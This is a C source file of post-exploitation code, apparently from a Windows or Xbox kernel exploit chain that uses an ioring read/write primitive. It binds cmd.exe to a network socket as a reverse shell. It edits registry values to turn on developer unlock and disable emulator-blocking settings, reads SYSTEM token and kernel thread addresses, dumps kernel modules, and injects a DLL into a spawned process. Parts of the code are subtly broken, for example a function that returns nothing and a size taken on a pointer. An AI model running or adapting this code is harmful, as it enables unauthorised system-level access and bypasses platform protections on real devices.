#include "post_exploit.h"
#include "win_defs.h"
#include "ioring.h"
#include "util.h"
#include "krnl_dumper.h"

#include <stdio.h>
#include <Windows.h>
#include <lmcons.h>
#include <metahost.h>
#pragma comment(lib, "mscoree.lib")



char* sock_read(SOCKET sock) {
    char msg[1024] = { 0 };
    recv(sock, msg, 1024, MSG_PEEK);
}

void spawn_cmd(SOCKET sock) {
    // Spawn CMD using the socket for input and output
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, "S:\\", &sinfo, &pinfo);
    while (1) {}
}



BOOL set_reg() {
    DWORD dwMode = 1;
    LRESULT lResult;
    BOOL ret = TRUE;
    lResult = RegSetKeyValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock", "AllowDevelopmentWithoutDevLicense", REG_DWORD, &dwMode, sizeof(dwMode));
    if (lResult != ERROR_SUCCESS) ret = FALSE;
    lResult = RegSetKeyValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\Appx", "AllowDevelopmentWithoutDevLicense", REG_DWORD, &dwMode, sizeof(dwMode));
    if (lResult != ERROR_SUCCESS) ret = FALSE;
    DWORD dwDevUnlock = 4;
    lResult = lResult = RegSetKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\SOFTWARE\\Microsoft\\SecurityManager", "InternalDevUnlock", REG_DWORD, &dwDevUnlock, sizeof(dwDevUnlock));
    if (lResult != ERROR_SUCCESS) ret = FALSE;
    DWORD dwValue = 0;
    RegSetKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings", "BlockEmulatorsEnabled", REG_DWORD, &dwValue, sizeof(dwValue));
    RegDeleteKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings", "BlockEmulatorsRestrictedExeSubstrings");
    RegDeleteKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings", "BlockEmulatorsLogOnlyExeSubstrings");
    RegDeleteKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings", "BlockEmulatorsPublisherPackageStrings");
    return ret;
}


int inject_dll(HANDLE hProcess, char* dllPath) {
    HMODULE hKernel32 = GetModuleHandle("KernelBase");
    if (!hKernel32)
        return -1;

    VOID* pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryW");
    if (!pLoadLibrary)
        return -2;

    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess,
        NULL,
        sizeof(dllPath) + 1,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if (!pRemoteBuffer)
        return -3;

    if(!WriteProcessMemory(hProcess, pRemoteBuffer, dllPath, sizeof(dllPath) + 1, 0))
        return -4;

    HANDLE hRemoteThread = CreateRemoteThread(hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pRemoteBuffer,
        0,
        NULL);
    
    return 0;
}

BOOL FileExists(LPCTSTR szPath)
{
    DWORD dwAttrib = GetFileAttributes(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

// Put your own code in here!
// Provided is a simple reverse shell example
void post_exploit(SOCKET sock)
{
    CHAR msg[1024] = { 0 };
    //char username[UNLEN + 1];
    //DWORD username_len = UNLEN + 1;
    //GetUsername(username, &username_len);

    sock_log(sock, "-hpayload\n");
    
    // add process hollowing, dll injection and manual mapping!

    
    int data = 1;
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"OSDATA\\Software\\Microsoft\\SecurityManager",
        L"InternalDevUnlock",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] InternalDevUnlock enabled.\n");
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock",
        L"AppModelUnlock",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] AppModelUnlock enabled.\n");
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\Appx",
        L"AllowDevelopmentWithoutDevLicense",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] AllowDevelopmentWithoutDevLicense enabled.\n");
    
    //CreateFileW("C:/Windows/System32/testing.txt", GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

    
    
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CHAR ptr_msg[1024] = { 0 };

    SYSTEM_INFO sysInfo;
    
    GetSystemInfo(&sysInfo);
    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] System page size: %lu\n", sysInfo.dwPageSize);
    sock_log(sock, ptr_msg);

    
    ULONG len;
    aSYSTEM_BASIC_INFORMATION sysBasicInfo;
    NtQuerySystemInformation(SystemBasicInformation, &sysBasicInfo, sizeof(sysBasicInfo), &len);

    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] Krnl System page size: %lu\n", sysBasicInfo.PageSize);
    sock_log(sock, ptr_msg);


    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] Reading SysToken from 0x%llx.\n[?] Tokens for reference: [systok:0x%llx,systok2:%llx]\n", ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, get_sys_token(), get_systok2());
    sock_log(sock, ptr_msg);
    // kernel rw sanity check (debug purposes for my dumb ass)
    ULONG64 sysToken = 0;
    int readRes = ioring_read(0x65007500, ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, &sysToken, sizeof(ULONG64));

    if (sysToken != get_sys_token()) {
        sprintf_s(ptr_msg, sizeof(ptr_msg), "[!] SysToken reads don't match! readRes: %i [0x%llx/0x%llx/0x%llx]\n", readRes, sysToken, get_sys_token(), get_systok2());
        sock_log(sock, ptr_msg);
    }

    UINT64 kthreadAddr = __readgsqword(0x188); // checking if it works :o
    DWORD lastStatus = __readgsdword(0x1250);
    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] lastStatus: 0x%x, kthreadAddr: 0x%llx\n", lastStatus, kthreadAddr);
    sock_log(sock, ptr_msg);

    dump_kmodules(sock);

    // kernel rw no longer needed, so do some laundry
    ioring_cleanup();

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, "D:\\", &sinfo, &pinfo);
    int res = inject_dll(pinfo.hProcess, "D:\\testdll.dll");
    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] dll injection returned: %i\n", res);
    sock_log(sock, ptr_msg);



    while (1) {}
    
}
